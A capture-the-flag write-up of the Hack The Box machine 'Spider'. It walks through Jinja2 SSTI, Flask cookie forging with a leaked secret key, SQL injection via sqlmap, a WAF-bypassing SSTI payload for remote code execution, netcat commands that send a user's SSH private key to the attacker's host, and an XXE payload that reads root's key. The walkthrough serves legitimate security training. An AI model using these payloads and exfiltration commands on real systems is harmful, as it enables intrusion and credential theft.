---
title: Hack The Box&#58; Spider
permalink: /HTB/Spider
layout: default
classes: wide
---
{% raw %}
<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_Big.png?raw=true" class="Box_Logo" unselectable="on" />
Spider is a hard level box on HackTheBox and heavily focuses on web exploits, hence the name. As with all hard boxes on HackTheBox, it requires a multi-step process and it is recommended that you have experience with web exploits or knowledge of the OWASP Top 10 prior to attempting this box. 

# Walkthrough

A full nmap scan `nmap -p- 10.10.10.243` reveals that only ports 22 and 80 are open, with the services being SSH and HTTP, respectively. A detailed scan of these two doesn't add too much.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 500 Internal Server Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Adding the line `10.10.10.243 spider.htb` to our `/etc/hosts` allows us to access the website being hosted through entering `http://spider.htb` in the url. The website appears to be a chair store. 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_1.png?raw=true) 

Scanning for directories and subdomains with Gobuster doesn't reveal much. When we register and login, I notice that there's a 10 character limit, we are given a UUID to login with rather than a username, and that our username is reflected back to us after we login with the UUID and password combination. Based on this, there's some sort of database that is associating a UUID to a password and username. Since the login is determined by a UUID being checked by a database, we can't just SQL inject to bypass a login since we need an admin UUID first. So our other option is to work with how our username gets reflected back to us. We can't even try to run PHP code through our username because of the character limit, so let's try some SSTI (Server Side Template Injection). This is essentially placing bad inputs into the template engine that the web server is running to get it to do stuff for us, which can range from just gathering info to RCE. We can test for the backend being Jinja2 through registering our username as `{{7 * 7}}` and then checking the `User Information` tab on the left.

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_2.png?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

Alright, the website is vulnerable to Jinja2 based SSTI. However, with a 10 character limit, we can't achieve RCE. Since this website has a Jinja2 template, it can either be running Flask or Django which are python based web frameworks. With Flask we can input `{{config}}` as our username to essentially set our username to be a call to the configuration object. And testing this works! We get the following information. 

```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 
'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 
'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 
'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 
'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 
'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 
'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 
'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 
'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>
```

What should catch our eye is the `SECRET_KEY` key in the dictionary, with a value of `Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942`. The way Flask signs session cookies is through a three part structure, separated by periods. 

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_3.png?raw=true) 

The left side contains session data which is base64 encoded; this session data varies depending upon the website. The middle is self explanatory. The last part is determined through creating a Sha-1 hash of our session data, current timestamp, and the secret key. So now that we have the secret key, we can deconstruct our cookie for more information. We will use the `flask-unsign` tool for this which can be installed by `pip3 install flask-unsign`. We can then grab our session cookie (by viewing it through inspect elements) and use flask-unsign to decode it. Run the command 
`flask-unsign --decode -c '<cookie>' --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'`
This should return something along the lines of 

````bash
flask-unsign --decode -c '<cookie>' --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'

{'cart_items': [], 'uuid': '19bb7b62-a29f-4aa4-98de-7381da6c02d5'}
````

Remember how we thought that the website used a database to match our UUID with a username? We can now test for SQL inject now that we have direct access to our UUID. Run this command 
```bash
flask-unsign --sign -c "{'cart_items': [], 'uuid': '<your uuid from decoding cookie here>\'-- a'}" --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```
What we are doing with this is essentially just commenting the rest of the MySql query once our UUID is passed in. Once we create that cookie, replace our current cookie with it, and refresh the home page. We are still logged in. So we can confirm there is some SQL injection occuring here. 
<br>
<br>
We can use this vulnerability to its fullest extent with the tool `sqlmap`, a tool that automates Sql injection. Run this command 
```bash
sqlmap http://spider.htb --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --dump
```
Sqlmap has an eval option which evaluates a one line python statement. In this command, we are using sqlmap to create a flask cookie, and then perform Sql injection with the cookie to try and dump the database. When the command prompts for a processing of a cookie (should be the first prompt), say yes. Say no to the merging of cookies because that will make our injection fail. Url encoding of the cookie doesn't really matter if we say yes or no. Once this command is done, we should find this interesting info:

```
1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331
```

Considering how this is the first and only hard-coded user, we should investigate this. Unfortunately we cannot SSH with those creds, but we do get to log into the user `chiv` on the website, who is actually an admin user! We can now further enumerate the website. We can access the `/main` page which has some interesting features.

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_4.png?raw=true) 

We can send messages that end up going to `/view?check=messages`and we can view support tickets in `/view?check=support`. A quick peek into the messages shows that there is a link to `/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal` which is where the support tickets come from. It appears that, based on the SQL dump from earlier, messages and support tickets are uploaded there which are pulled by the website, where the check variable matches the table from the database. I tried creating PHP code with the messages but it seems the angled brackets get filtered. SSTI doesn't work there either because curly brackets are also filtered. 

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_5.png?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

Onto the support ticket. The support message doesn't filter anything but doesn't do anything either but the title is different. It has a Web Application Firewall (WAF) which filters bad characters. This is probably our way in. Testing some bad characters, we get a list of what is being filtered. `periods, single quotes, the word if, double sets of curly brackets, and underscores` are being filtered. 

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_6.png?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

Also, PHP code doesn't work here, so SSTI is probably gonna be our attack vector. But without double curly brackets and all this WAF stuff, what do we do? Luckily, an article by the name of our user, <a href="https://hackmd.io/@Chivato/HyWsJ31dI">chiv</a>, along with <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadAllTheThings</a>, actually helps a lot. We are going to use a payload based off this template `{% include %}`, which is a Jinja tag that is usually used to include some content into the current page. However, we can manipulate it to get RCE. We are going to combine our payload template with this one: 
```
{{request.application.__globals__.__builtins__.__import__('os').system('<some command>')}}
``` 
to get something like 
```
{% include request.application.__globals__.__builtins__.__import__('os').system('<some command>'%}
```
Combining the two together and working around the WAF, our final payload looks like this: 
```
{% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["system"]("someCommandHere") %}
```
Disgusting. But it works. And there's a reason for this. What the second payload is doing is calling on the request class, then it calls its global attributes, then from its global attributes it calls for the builtins attributes, then it calls the import method and passes the value "os", which is one of the builtins (the module os  is used for terminal commands), and from there we can execute commands. However, now we need to make this payload bypass the filter. To do this we are going to first hex encode all of our single quotes, since python can automatically convert hex encoded strings back to normal text with the `\x` prefix. So we are replacing all of our `_` with `\x5f`. To bypass the `.`, we can treat each object as an array of properties and use brackets. This can be done like this: `firstClass["__SomeProperty__"]["__SomePropertyOfSomeProperty__"]("MethodArgument__ForSomePropertyOfSomeProperty__") `Once we use both of those bypass techniques, we get that final ugly payload. Here is a picture to better visualize the process

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_7.png?raw=true) 



```
(1) {{ }} <-- Normal SSTI template 
(2) {% include %} <-- We use this to include something; in our case, a call to a function 
(3) {{request.application.__globals__.__builtins__.__import__("os").system("<some command>")}} <-- SSTI RCE template
(4) {% include request.application.__globals__.__builtins__.__import__("os").system("<some command>") %} <-- combining 2, 3 to bypass {{}} filter
(5) {% include request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["system"]("<someCommand") %} <-- 4, bypassing . filter
(6) {% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["system"]("<someCommand>") %} <-- 5, bypass _ filter via hex
```

Now that we have our payload, we should use Burp's Repeater function to make our lives easier. To test the payload, we will use a sleep command to replace the `<someCommand>` part of my payload. Our Burp Repeater request looks like this:

```http
POST /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal HTTP/1.1
Host: spider.htb
Content-Length: 166
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://spider.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjEyOWY2MGVhLTMwY2YtNDA2NS1hZmI5LTZiZTQ1YWQzOGI3MyJ9.YYBDyA.3WHcEPN_Anplrc-JBTiCAwDO4LY
Connection: close

contact={% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["system"]("sleep 5") %}&message=a
```

And the sleep test works! Remember that SSH is running, so let's hope that we're a user. Sending a `whoami | netcat 10\x2e10\x2e16\x2e\18 4444` in our payload with a netcat listener on 4444 via `netcat -nvlp 4444` on our host machine shows us that we are `chiv`. So we can try reading our ssh key. Once again, we have to set up a listener and use `cat ~/.ssh/id_rsa | netcat 10\x2e10\x2e16\x2e\18 4444` in our payload to get the key.

```
Ncat: Connection from 10.10.10.243:55590.                                                              
-----BEGIN RSA PRIVATE KEY-----                                                                        
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV                                       
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS                                       
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9                                       
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7                                       
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2                                       
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu                                       
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs                                       
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl                                       
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc                                       
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq                                       
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy                                       
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62                                       
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL                                       
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO                                       
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW                                       
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv                                       
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----
```

Perfect, now we can SSH in. Copy and paste the key info into a file and `chmod 400 keyFile` so we can use. To actually SSH into chiv, use `ssh chiv@spider.htb -i keyFile`. 

```
└─# ssh chiv@spider.htb -i key 
Last login: Fri May 21 15:02:03 2021 from 10.10.14.7
chiv@spider:~$ 
```

Now that we're in, a quick view into the `/var/www` directory and `netstat -tulpn` shows us that there's another website running. Judging by file permissions on `/var/www/game`, it's a root run website, and using `ps -aux | grep game` confirms this for us.

```
chiv@spider:~$ ls -l /var/www
total 12
drw-r--r-- 6 root www-data 4096 May 18 00:23 game
drwxr-xr-x 2 root root     4096 May 18 00:23 html
drwxr-xr-x 5 chiv chiv     4096 Nov  1 20:09 webapp
chiv@spider:~$ netstat -tulpn
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
chiv@spider:~$ ps -aux | grep game
root       1341  0.0  0.8 108856 33144 ?        Ss   16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
root       1700  0.0  0.5 108856 22084 ?        S    16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
root       1701  0.0  0.5 108856 22084 ?        S    16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
root       1704  0.0  0.5 108856 22084 ?        S    16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
root       1705  0.0  0.5 108856 22084 ?        S    16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
root       1706  0.0  0.5 108856 22084 ?        S    16:39   0:00 /usr/local/bin/uwsgi --ini game.ini
chiv       2440  0.0  0.0  13144  1108 pts/0    S+   20:51   0:00 grep --color=auto game
```

Since the website is locally hosted, let's sign out of our SSH session and restart it but this time forwarding the port to our host. The command `ssh -L 80:127.0.0.1:8080 chiv@spider.htb -i key`will do this to us. What this is doing is that we open our `port 80` on `127.0.0.1` (localhost) to send and receive traffic from `spider.htb` on their `port 8080`, since the website is being locally hosted on chiv's machine on port 8080. With this, we can now access it through our browser via inputting `http://127.0.0.1:80` in our url. It appears to be another login page without authentication, and another furniture store. This seems pretty bare once again

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_8.png?raw=true) 

Even analyzing the request in Burp doesn't return much. However, the version number seems a bit random and therefore suspicious.

```http
POST /login HTTP/1.1
Host: 127.0.0.1
Content-Length: 24
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJw1zE1vgjAAxvGvsvS8A3XGZBybtnRoIS19kd5sugSUAkOyMY3ffRqz45PfP88VdEvsQHoFLx6kQJOCBrIoccqNtHNvIrSflv965tqDpmuVjShoiMVecoPlTpNmG-LHRVczvntf6QKVdGTyiNzDH9slHRY25CIha0eb0mfFXNimNVBP1si3EGWt4nL0ygx1F8w2KcZn__xzEDHPxpqf3HT3czDoS6iG87hsLM6zwyrfe2aEW73_97i0s7M0H3QWvkvyc6l613JIJnB7BePQ9vMZpMntDzT_U6g.YYBZ1Q.uFa2ccvwdovX-iN555lAX9IUMYE
Connection: close

username=a&version=1.0.0
```

Also, we should notice once again that our name is reflected to us. Trying to fuzz with SSTI and PHP inputs isn't working, though. Peeking into the `/var/www/game` directory, we notice that its another python website so maybe we can mess with cookies again and hope that the secret key is shared between websites.

```
chiv@spider:~$ ls /var/www/game/
ls: cannot access '/var/www/game/templates': Permission denied
ls: cannot access '/var/www/game/__MACOSX': Permission denied
ls: cannot access '/var/www/game/__pycache__': Permission denied
ls: cannot access '/var/www/game/wsgi.py': Permission denied
ls: cannot access '/var/www/game/app.py': Permission denied
ls: cannot access '/var/www/game/game.ini': Permission denied
ls: cannot access '/var/www/game/static': Permission denied
app.py  game.ini  __MACOSX  __pycache__  static  templates  wsgi.py
```

Taking our cookie and decoding it like last time, we notice that there's some `lxml` property and another base64 encoded value.

```bash
└─# flask-unsign --decode -c '.eJw1zE1vgjAAxvGvsvS8A3XGZBybtnRoIS19kd5sugSUAkOyMY3ffRqz45PfP88VdEvsQHoFLx6kQJOCBrIoccqNtHNvIrSflv965tqDpmuVjShoiMVecoPlTpNmG-LHRVczvntf6QKVdGTyiNzDH9slHRY25CIha0eb0mfFXNimNVBP1si3EGWt4nL0ygx1F8w2KcZn__xzEDHPxpqf3HT3czDoS6iG87hsLM6zwyrfe2aEW73_97i0s7M0H3QWvkvyc6l613JIJnB7BePQ9vMZpMntDzT_U6g.YYBXeA.GMkFDpCNWkCjWNLF9nIVQ3G3dxc' --secret Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 'points': 0}
```

Using `echo` and piping the base64 content to `base64` via `echo '<long string>' | base64 -d` shows us that the value of the `lxml` key is some sort of base64 encoded xml content.

```xml
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>a</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

We should notice two things: there is a `is_admin` property and the `username` property seems to be the one that is reflected on the website. The `is_admin` property is a dead end, changing it to 1 doesn't actually do anything, so let's attempt some XXE (XML External Entity). It appears that the version number in our `POST` request is the one that appears in the XML. I will be basing our payload on a XXE template from PayloadAllTheThings.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
 
```

In this template the variable `example` is the return value of a System read of the file `/etc/passwd` When this result is actually printed out , instead of John's last name, the contents of `/etc/passwd` are there. Given that this website is running as root, we essentially have root file read. Considering how chiv had a SSH key, I will try to read root's SSH key if it has one. Since `username` is the value being reflected to us, we should aim to set `username` to the contents of the key. Our XML should look like this

```xml
<!-- API Version 1.0.0 --> <!DOCTYPE root [<!ENTITY a SYSTEM 'file:///root/.ssh/id_rsa'>]> <!-- -->
<root>
    <data>
        <username>&a;</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

To achieve this, we have to remember our 2 `POST` request values, `username`, and `version`. `version` is on the first line and gets closed by a comment by the server. So we have to prematurely close the comment in our `version` input, then insert the call to the SSH key, then reopen a comment for the system to automatically close it. Regarding `username`, all it has to be is a reference to the call to the SSH key, which is assigned to the variable `a`, so `username` would be `&a;`. Load up Burp, access the login page (make sure you logout of the website in case you already logged in before, so the cookies don't get messy), and intercept the login `POST` request. Configure it to look like this:

```http
username=&a;
version=1.0.0 --> <!DOCTYPE root [<!ENTITY a SYSTEM 'file:///root/.ssh/id_rsa'>]> <!-- 
--------------------------------------------------POST REQUEST-----------------------------------------------------
POST /login HTTP/1.1
Host: 127.0.0.1
Content-Length: 109
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJwb2ludHMiOjB9.YYBeAw.tCyjLgslZtrS5XjYXhIlNpYDgi0
Connection: close

username=%26a%3b&version=1.0.0+-->+<!DOCTYPE+root+[<!ENTITY+a+SYSTEM+'file%3a///root/.ssh/id_rsa'>]>+<!--
--------------------------------------------------END POST REQ-----------------------------------------------------
**NOTE THAT I URL ENCODED THE VALUES OF USERNAME AND VERSION
```

Doing this gets us this beautiful mess

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/Spider_9.png?raw=true) 

From here either get the key via Burp's HTTP history or use `inspect elements` by right clicking the page to find the whole text of the key. From here repeat the process of copying the text into a file, changing the file permissions, and then SSHing into root. Spider has been pwned.

## Afterthoughts

I think I was a little rusty with my webapps because this box was insanely difficult for me and I had to get a lot of outside assistance, and in hindsight, this box wasn't extremely difficult. However, it's refreshing to do these kinds of exploits again rather than service exploits via ExploitDB or learning how to exploit one service in particular. This box is definitely challenging but you learn a lot. 

--Dylan Tran 11/1/21
{% endraw %}
